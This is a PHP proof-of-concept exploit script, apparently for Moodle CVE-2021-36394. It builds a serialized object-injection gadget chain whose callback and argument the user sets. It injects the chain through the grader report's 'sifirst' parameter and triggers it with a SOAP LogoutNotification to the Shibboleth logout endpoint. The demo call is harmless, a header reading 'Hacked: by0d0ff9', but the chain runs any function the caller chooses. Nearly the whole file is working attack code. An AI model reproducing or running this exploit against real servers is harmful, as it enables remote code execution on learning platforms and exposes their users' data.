<?php

/* 

Demo: https://www.youtube.com/watch?v=rn4ENyASWe8
Blog: https://0xd0ff9.wordpress.com/2021/08/28/cve-2021-36394-hack-truong-sua-diem-cac-kieu/

 */
namespace core\lock {
    class lock {}

}


namespace core_availability{
    class tree {}
}

namespace core\dml{
    class recordset_walk {}
}


namespace {
    class question_attempt_iterator{
        // protected $slots = array(1337);
    }
    class core_question_external{}
    class question_usage_by_activity{}
   
    function httpPost($url, $data, $MoodleSession, $xml)
    {
        $curl = curl_init($url);
        $headers = array('Cookie: MoodleSession='.$MoodleSession);
        if($xml){
            array_push($headers, 'Content-Type: application/xml');
        }else{
            $data =  urldecode(http_build_query($data));
        }
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($curl, CURLOPT_HEADER, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        // curl_setopt($curl, CURLOPT_PROXY, '127.0.0.1:8080'); //proxy
        $response = curl_exec($curl);
        var_dump($response);
        curl_close($curl);
        return $response;
    }


    function pwn($url, $MoodleSession, $function, $param){

        $add_lib = new core_question_external();
        $lib_fb = new \core\lock\lock();
        $lib_fb -> key = new \core_availability\tree();
            $lib_fb -> key -> children = new \core\dml\recordset_walk();
                $lib_fb -> key -> children -> callback = $function;
                $lib_fb -> key -> children -> recordset = new question_attempt_iterator();
                    $lib_fb -> key -> children -> recordset -> quba = new question_usage_by_activity();
                        $lib_fb -> key -> children -> recordset -> quba -> questionattempts = array(1337=>$param);
                    $lib_fb -> key -> children -> recordset -> slots = array(1337);
        $lib_fb -> infinite = 1;



        $arr = array($add_lib, $lib_fb);
        
        $value = serialize($arr);
        // echo "\n============ Payload ===========\n";
        // echo base64_encode("Testaaaaa|".$value."Testbeeee|");
        echo "\n [*] Inject Payload ";
        $data = array("id"=>1, "sifirst"=>'Testaaaaa|'.$value.'Testbbbbbb|');
        httpPost($url.'/grade/report/grader/index.php',$data, $MoodleSession, 0);
        echo "\n [*] Trigger Payload ";
        $data = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>
    <LogoutNotification><SessionID>ssss</SessionID>
    </LogoutNotification></s:Body></s:Envelope>';
        httpPost($url.'/auth/shibboleth/logout.php', $data, $MoodleSession, 1);
    }

// Exploit Main
    $url = $argv[1];

    $MoodleSession = 'v8grl591eoi47agqac0ddlsp3v'; 
    $function = "header";
    $param = "Hacked: by0d0ff9";

    pwn($url, $MoodleSession, $function, $param);






}

?>
